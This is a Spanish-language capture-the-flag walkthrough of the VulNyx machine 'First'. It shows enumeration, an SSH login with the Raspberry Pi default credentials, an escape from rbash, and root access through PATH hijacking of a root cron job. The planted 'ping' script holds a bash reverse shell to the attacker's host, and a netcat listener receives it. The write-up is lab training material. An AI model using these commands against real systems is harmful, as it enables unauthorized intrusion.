# WriteUp: First | VulNyx

Al iniciar la máquina virtual, me encontré con el mensaje `Welcome to my Raspberry!`, una clara indicación de que el sistema operativo probablemente era Raspberry Pi OS. Este dato inicial guiaría parte de mi estrategia de enumeración.

## <mark style="color:yellow;">Fase 1: Reconocimiento y Enumeración</mark>

Inicié el reconocimiento desde mi máquina Kali con un escaneo de `nmap` para descubrir todos los puertos abiertos en el objetivo.

```bash
nmap -n -Pn -sS -p- --min-rate 5000 192.168.56.25

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4369/tcp open  epmd
```

Una vez identificados los puertos, procedí con un escaneo más detallado para obtener las versiones de los servicios en ejecución.

```bash
nmap -sVC -p22,80,4369 192.168.56.25

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 24:83:97:49:96:11:7c:7a:54:00:17:3b:0c:f6:e1:54 (RSA)
|   256 83:cc:d0:72:41:48:fc:c4:ba:46:a1:0e:70:50:52:71 (ECDSA)
|_  256 a0:37:99:32:78:17:69:4f:1d:ac:75:1e:ba:19:58:45 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|_  nodes:
```

El servicio `Erlang Port Mapper Daemon (epmd)` en el puerto 4369 captó mi atención. Al ser un servicio menos común, decidí investigar posibles vulnerabilidades públicas utilizando `searchsploit`.

```bash
searchsploit erlang
---------------------------------------------------------------------------------------------------
 Exploit Title                                                                                     |  Path
---------------------------------------------------------------------------------------------------
...
Erlang - Port Mapper Daemon Cookie Remote Code Execution (Metasploit)                              | multiple/remote/46024.rb
Erlang Cookie - Remote Code Execution                                                              | multiple/remote/49418.py
...
---------------------------------------------------------------------------------------------------
```

Los resultados mostraron un posible vector de ejecución remota de código (RCE). Al inspeccionar el módulo de Metasploit (`exploit/multi/misc/erlang_cookie_rce`), noté que requería un parámetro `COOKIE` para funcionar, un dato que no poseía en ese momento. Dejé esta información como una posible vía de ataque para más adelante y continué con la enumeración.

## <mark style="color:yellow;">Fase 2: Enumeración Web y Acceso Inicial</mark>

Al analizar el servidor web en el puerto 80, encontré la página por defecto de Apache en Debian.

<figure><img src="../../.gitbook/assets/Pasted image 20250930010543.png" alt=""><figcaption></figcaption></figure>

Realicé una enumeración de directorios con `gobuster` para descubrir contenido oculto.

```bash
gobuster dir -u http://192.168.56.25 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
/tasklist             (Status: 200) [Size: 137]
...
```

El directorio `/tasklist` contenía una lista de tareas simple, donde una de ellas, `[v] Update Raspberry`, me pareció un posible indicio. Intenté utilizar "Update Raspberry" como la `COOKIE` para el exploit de Erlang, pero no tuve éxito.

Sin más vectores de ataque aparentes, reconsideré la naturaleza del sistema: una Raspberry Pi con el puerto 22 (SSH) abierto. Esto me llevó a investigar las credenciales por defecto de Raspberry Pi OS. Mi investigación confirmó que las versiones antiguas utilizaban **usuario `pi`** y **contraseña `raspberry`**. Procedí a probar estas credenciales.

```bash
ssh pi@192.168.56.25
pi@192.168.56.25's password: raspberry

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberry:~ $ id
uid=1000(pi) gid=1000(pi) grupos=1000(pi)
```

El acceso fue exitoso. Obtuve una shell como el usuario `pi`.

## <mark style="color:yellow;">Fase 3: Escalada de Privilegios por PATH Hijacking</mark>

Una vez dentro, comencé la fase de escalada de privilegios. Las comprobaciones iniciales con `sudo -l` y búsqueda de binarios SUID no arrojaron resultados. Sin embargo, al revisar las tareas programadas en `/etc/crontab`, encontré una entrada de gran interés.

```bash
pi@raspberry:~ $ cat /etc/crontab
...
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/var/www/html:/bin:/usr/sbin:/usr/bin
...
* * * * * root ping -c1 raspberrypi.com
```

Identifiqué una vulnerabilidad clásica de **secuestro de la variable de entorno PATH**. Una tarea cron, ejecutándose como `root` cada minuto, ejecuta el comando `ping` sin especificar su ruta absoluta (`/bin/ping`). El `PATH` del cron incluye el directorio `/var/www/html` antes que `/bin`.

Verifiqué los permisos de dicho directorio:

```bash
ls -la /var/www/html
drwxrwxrwx 2 www-data www-data  4096 ene  7  2024 .
...
```

El directorio `/var/www/html` tiene permisos de escritura para todos los usuarios. Esto me permite crear un script malicioso llamado `ping` dentro de este directorio, que será ejecutado por `root` en lugar del binario original.

Al intentar crear el script, me encontré con una `rbash` (restricted bash).

```bash
echo '#!/bin/bash' > /var/www/html/ping
-rbash: /var/www/html/ping: restringido: no se puede redirigir la salida
```

Escapé de la shell restringida utilizando Python.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Ya en una shell `bash` estándar, creé mi payload, que establecerá una reverse shell hacia mi máquina.

```bash
echo '#!/bin/bash' > /var/www/html/ping
echo 'bash -i >& /dev/tcp/192.168.56.22/4444 0>&1' >> /var/www/html/ping
```

Otorgué permisos de ejecución al script.

```bash
chmod +x /var/www/html/ping
```

Finalmente, puse un listener de `netcat` en mi máquina atacante para recibir la conexión.

```bash
nc -lvnp 4444
```

Al cabo de un minuto, la tarea cron se ejecutó, activando mi payload y otorgándome una shell como `root`. 👾

```bash
# Conexión recibida
root@raspberry:~# id
uid=0(root) gid=0(root) groups=0(root)
root@raspberry:~# cat user.txt
09XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
root@raspberry:~# cat root.txt
a4XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
